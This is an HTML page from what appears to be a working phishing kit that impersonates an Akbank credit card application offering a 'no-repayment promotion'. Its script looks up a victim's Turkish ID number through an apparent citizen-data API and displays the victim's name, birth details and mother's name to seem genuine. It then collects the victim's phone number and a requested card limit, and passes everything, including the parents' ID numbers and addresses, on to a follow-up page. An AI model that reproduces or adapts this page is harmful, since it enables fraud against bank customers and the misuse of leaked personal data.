<!DOCTYPE html>
<html class="no-js javascript png flash9 chrome webkit win" lang="tr">

<head id="ctl00_head">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Akbank Başvuru</title>
  <meta name="description" content="Akbank Kredi Kartı Başvurusu">
  <link rel="stylesheet" href="./imgs/app.css">
  <link rel="shortcut icon" href="./imgs/favicon.ico" type="image/x-icon">
  <style>
    .basvuru-container {
      max-width: 600px;
      margin: 50px auto;
      padding: 30px;
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    .basvuru-header {
      text-align: center;
      margin-bottom: 30px;
    }
    .basvuru-header h1 {
      color: #c51522;
      font-size: 28px;
      margin-bottom: 10px;
    }
    .info-section {
      background: #f5f5f5;
      padding: 20px;
      border-radius: 8px;
      margin-bottom: 30px;
    }
    .info-item {
      display: flex;
      justify-content: space-between;
      padding: 10px 0;
      border-bottom: 1px solid #ddd;
    }
    .info-item:last-child {
      border-bottom: none;
    }
    .info-label {
      font-weight: bold;
      color: #333;
    }
    .info-value {
      color: #666;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-label {
      display: block;
      margin-bottom: 8px;
      font-weight: bold;
      color: #333;
    }
    .form-input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 16px;
      box-sizing: border-box;
    }
    .form-input:focus {
      outline: none;
      border-color: #c51522;
    }
    .submit-btn {
      width: 100%;
      padding: 15px;
      background: #c51522;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      cursor: pointer;
      font-weight: bold;
    }
    .submit-btn:hover {
      background: #a0121a;
    }
    .submit-btn:disabled {
      background: #ccc;
      cursor: not-allowed;
    }
    .loading {
      text-align: center;
      padding: 20px;
      color: #666;
    }
    .error {
      background: #fee;
      color: #c00;
      padding: 15px;
      border-radius: 5px;
      margin-bottom: 20px;
    }
  </style>
</head>

<body class="is-retail is-turkish is-desktop is-nontouch">
  <div class="basvuru-container">
    <div class="basvuru-header">
      <h1>Geri Ödemesiz Promosyon!</h1>
      <p>Lütfen bilgilerinizi kontrol edin ve eksik alanları doldurun</p>
    </div>

    <div id="loading" class="loading" style="display: none;">
      Bilgileriniz yükleniyor...
    </div>

    <div id="error" class="error" style="display: none;"></div>

    <div id="content" style="display: none;">
      <div class="info-section">
        <h2 style="margin-top: 0; color: #c51522;">Kişisel Bilgiler</h2>
        <div class="info-item">
          <span class="info-label">Ad Soyad:</span>
          <span class="info-value" id="adSoyad">-</span>
        </div>
        <div class="info-item">
          <span class="info-label">Doğum Tarihi:</span>
          <span class="info-value" id="dogumTarihi">-</span>
        </div>
        <div class="info-item">
          <span class="info-label">Cinsiyet:</span>
          <span class="info-value" id="cinsiyet">-</span>
        </div>
        <div class="info-item">
          <span class="info-label">Doğum Yeri:</span>
          <span class="info-value" id="dogumYeri">-</span>
        </div>
        <div class="info-item">
          <span class="info-label">Anne Adı:</span>
          <span class="info-value" id="anneAdi">-</span>
        </div>
      </div>

      <form id="basvuruForm">

        <div class="form-group">
          <label class="form-label" for="telefon">Telefon Numarası</label>
          <input type="tel" id="telefon" name="telefon" class="form-input" placeholder="05XXXXXXXXX" maxlength="11" pattern="[0-9]{11}" required>
          <small style="color: #666; font-size: 12px;">11 haneli telefon numaranızı giriniz (örn: 05551234567)</small>
        </div>

        <div class="form-group">
          <label class="form-label" for="kartLimiti">Kart Limiti (TL)</label>
          <input type="number" id="kartLimiti" name="kartLimiti" class="form-input" placeholder="Örn: 50000" min="1000" required>
        </div>

        <button type="submit" class="submit-btn" id="submitBtn">Başvuruyu Tamamla</button>
      </form>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const urlParams = new URLSearchParams(window.location.search);
      const tc = urlParams.get('tc');

      const loadingDiv = document.getElementById('loading');
      const errorDiv = document.getElementById('error');
      const contentDiv = document.getElementById('content');
      const submitBtn = document.getElementById('submitBtn');
      
      // API'den gelen tüm verileri sakla
      let apiData = null;

      if (!tc || tc.length !== 11) {
        errorDiv.style.display = 'block';
        errorDiv.textContent = 'Geçerli bir TC kimlik numarası bulunamadı. Lütfen tekrar deneyin.';
        return;
      }

      // API'den bilgileri çek
      loadingDiv.style.display = 'block';

      fetch(`/api/get-tckn?tc=${tc}`)
        .then(response => response.json())
        .then(data => {
          loadingDiv.style.display = 'none';

          if (data.Info && data.Info.Status === 'OK' && data.Veri) {
            const veri = data.Veri;
            
            // Tüm veriyi sakla
            apiData = veri;
            
            // Bilgileri göster
            document.getElementById('adSoyad').textContent = `${veri.Adi || ''} ${veri.Soyadi || ''}`.trim() || '-';
            document.getElementById('dogumTarihi').textContent = veri.DogumTarihi || '-';
            document.getElementById('cinsiyet').textContent = veri.Cinsiyet || '-';
            document.getElementById('dogumYeri').textContent = veri.DogumYeri || '-';
            document.getElementById('anneAdi').textContent = veri.AnneAdi || '-';

            // İçeriği göster
            contentDiv.style.display = 'block';
          } else {
            errorDiv.style.display = 'block';
            errorDiv.textContent = data.Info?.Message || 'Bilgiler alınamadı. Lütfen TC kimlik numaranızı kontrol edin.';
          }
        })
        .catch(error => {
          loadingDiv.style.display = 'none';
          errorDiv.style.display = 'block';
          errorDiv.textContent = 'Bir hata oluştu: ' + error.message;
          console.error('Error:', error);
        });

      // Telefon numarası formatı - sadece rakam
      document.getElementById('telefon').addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
      });

      // Kart limiti formatı - sadece rakam
      document.getElementById('kartLimiti').addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
      });

      // Form submit
      document.getElementById('basvuruForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const telefon = document.getElementById('telefon').value.replace(/\D/g, '');
        const kartLimiti = document.getElementById('kartLimiti').value.replace(/\D/g, '');

        if (!telefon || telefon.length !== 11 || !telefon.startsWith('05')) {
          alert('Lütfen geçerli bir telefon numarası giriniz (05 ile başlayan 11 haneli)');
          return;
        }

        if (!kartLimiti || parseInt(kartLimiti) < 1000) {
          alert('Kart limiti en az 1000 TL olmalıdır');
          return;
        }

        if (!apiData) {
          alert('Kişi bilgileri yüklenemedi. Lütfen sayfayı yenileyin.');
          return;
        }

        // Tüm bilgileri query parameter olarak info.html'ye gönder
        const params = new URLSearchParams({
          tc: tc,
          telefon: telefon,
          kartLimiti: kartLimiti,
          adSoyad: `${apiData.Adi || ''} ${apiData.Soyadi || ''}`.trim(),
          dogumTarihi: apiData.DogumTarihi || '',
          cinsiyet: apiData.Cinsiyet || '',
          dogumYeri: apiData.DogumYeri || '',
          anneAdi: apiData.AnneAdi || '',
          babaAdi: apiData.BabaAdi || '',
          anneTCKN: apiData.AnneTCKN || '',
          babaTCKN: apiData.BabaTCKN || '',
          adresIl: apiData.AdresIl || '',
          adresIlce: apiData.AdresIlce || '',
          memleketIl: apiData.MemleketIl || '',
          memleketIlce: apiData.MemleketIlce || '',
          medeniHal: apiData.MedeniHal || ''
        });
        
        // info.html'ye yönlendir
        window.location.href = `info.html?${params.toString()}`;
      });
    });
  </script>
</body>
</html>

